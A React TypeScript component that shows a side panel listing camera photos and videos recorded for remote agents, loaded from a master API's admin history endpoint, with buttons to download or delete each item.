import { useEffect, useState } from 'react'

// Backend-driven camera media list (camera_photo + camera_video) from history DB
export default function CameraMediaPanel({ open, onClose, agentId }: { open: boolean; onClose: () => void; agentId?: string }) {
  type Item = { id: string; ts: string; agent_id: string; kind: string; storage_url: string; size_bytes?: number }
  const [items, setItems] = useState<Item[]>([])
  const [loading, setLoading] = useState(false)
  const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
  const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''

  const refresh = async () => {
    setLoading(true)
    try {
      const url1 = new URL(`${apiBase}/admin/history`)
      url1.searchParams.set('kind', 'camera_photo')
      if (agentId) url1.searchParams.set('agent_id', agentId)
      const url2 = new URL(`${apiBase}/admin/history`)
      url2.searchParams.set('kind', 'camera_video')
      if (agentId) url2.searchParams.set('agent_id', agentId)
      const [r1, r2] = await Promise.all([
        fetch(url1.toString(), { headers: { Authorization: `Bearer ${token}` } }),
        fetch(url2.toString(), { headers: { Authorization: `Bearer ${token}` } }),
      ])
      const [j1, j2] = [await r1.json(), await r2.json()]
      const arr1: Item[] = Array.isArray(j1?.items) ? j1.items : []
      const arr2: Item[] = Array.isArray(j2?.items) ? j2.items : []
      const merged = [...arr1, ...arr2].sort((a,b)=> new Date(b.ts).getTime() - new Date(a.ts).getTime())
      setItems(merged)
    } catch {}
    setLoading(false)
  }

  useEffect(() => { if (open) refresh() }, [open, agentId])

  const del = async (id: string) => {
    try { await fetch(`${apiBase}/admin/history/${encodeURIComponent(id)}`, { method: 'DELETE', headers: { Authorization: `Bearer ${token}` } }) } catch {}
    await refresh()
  }

  return (
    <div style={{ position: 'fixed', top: 0, right: 0, bottom: 0, width: open ? 360 : 0, background: '#0f0f0f', borderLeft: '1px solid #222', overflow: 'hidden', transition: 'width 0.2s ease', zIndex: 1000 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 10, borderBottom: '1px solid #222' }}>
        <div style={{ color: '#9efc9e' }}>Camera Media</div>
        <div style={{ display: 'flex', gap: 8 }}>
          <button className="btn secondary" onClick={refresh} disabled={loading}>{loading ? '...' : 'Refresh'}</button>
          <button className="btn" onClick={onClose}>Close</button>
        </div>
      </div>
      <div style={{ padding: 10, overflowY: 'auto', height: 'calc(100% - 48px)' }}>
        {items.length === 0 && <div style={{ color: '#777' }}>No media</div>}
        {items.map((m) => {
          const date = new Date(m.ts).toLocaleString()
          const base = `${(m.agent_id || 'agent').replace(/[^\w\-\. ]+/g, '_')}-${m.kind}-${Date.now()}`
          const fname = m.kind === 'camera_photo' ? `${base}.jpg` : `${base}.webm`
          const sizeMb = typeof m.size_bytes === 'number' ? (m.size_bytes/1024/1024).toFixed(2) : '0.00'
          return (
            <div key={m.id} style={{ borderBottom: '1px solid #1b1b1b', padding: '8px 0' }}>
              <div style={{ color: '#ddd' }}>{m.agent_id}</div>
              <div style={{ color: '#777', fontSize: 12 }}>{m.kind.replace('camera_','').toUpperCase()} • {date} • {sizeMb} MB</div>
              <div style={{ display: 'flex', gap: 8, marginTop: 6 }}>
                <a className="btn" href={`${apiBase}${m.storage_url}`} download={fname} target="_blank" rel="noreferrer">Download</a>
                <button className="btn secondary" onClick={() => del(m.id)}>Delete</button>
              </div>
            </div>
          )
        })}
      </div>
    </div>
  )
}
